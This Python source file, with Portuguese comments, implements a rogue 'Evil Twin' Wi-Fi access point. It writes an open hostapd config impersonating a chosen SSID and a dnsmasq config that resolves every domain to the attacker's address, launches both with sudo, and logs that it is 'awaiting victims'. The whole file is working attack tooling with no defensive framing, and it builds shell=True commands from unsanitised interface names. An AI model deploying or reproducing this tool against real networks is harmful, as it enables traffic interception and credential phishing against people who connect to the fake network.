import os
import subprocess
import time
import threading

class DSITwin:
    def __init__(self, interface, ssid):
        self.interface = interface
        self.ssid = ssid
        self.conf_dir = "/tmp/dsi_twin"
        os.makedirs(self.conf_dir, exist_ok=True)
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.is_active = False

    def generate_configs(self):
        # Config do Hostapd (Ponto de Acesso Falso Aberto)
        hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
"""
        with open(f"{self.conf_dir}/hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        # Config do Dnsmasq (DHCP e DNS Spoofing)
        # Redireciona tudo para o IP que daremos à interface (10.0.0.1)
        dnsmasq_conf = f"""
interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
        with open(f"{self.conf_dir}/dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

    def start(self, log_callback=None):
        if self.is_active: return
        self.is_active = True
        
        def run():
            try:
                if log_callback: log_callback(f"Iniciando Ponto de Acesso Falso: {self.ssid}", log_type="cmd")
                
                # 1. Prepara a interface
                subprocess.run(f"sudo ip addr add 10.0.0.1/24 dev {self.interface}", shell=True)
                subprocess.run(f"sudo ip link set {self.interface} up", shell=True)
                
                # 2. Inicia Hostapd
                self.hostapd_proc = subprocess.Popen(
                    f"sudo hostapd {self.conf_dir}/hostapd.conf", 
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                
                # 3. Inicia Dnsmasq
                self.dnsmasq_proc = subprocess.Popen(
                    f"sudo dnsmasq -C {self.conf_dir}/dnsmasq.conf -d", 
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                
                if log_callback: log_callback("Portal Cativo ATIVO. Aguardando vítimas...")
                
            except Exception as e:
                if log_callback: log_callback(f"Erro no Evil Twin: {e}", log_type="error")
                self.stop()

        threading.Thread(target=run, daemon=True).start()

    def stop(self):
        self.is_active = False
        if self.hostapd_proc: self.hostapd_proc.terminate()
        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
        subprocess.run("sudo killall hostapd dnsmasq", shell=True)
        subprocess.run(f"sudo ip addr del 10.0.0.1/24 dev {self.interface}", shell=True)
        if os.path.exists(self.conf_dir):
            subprocess.run(f"rm -rf {self.conf_dir}", shell=True)
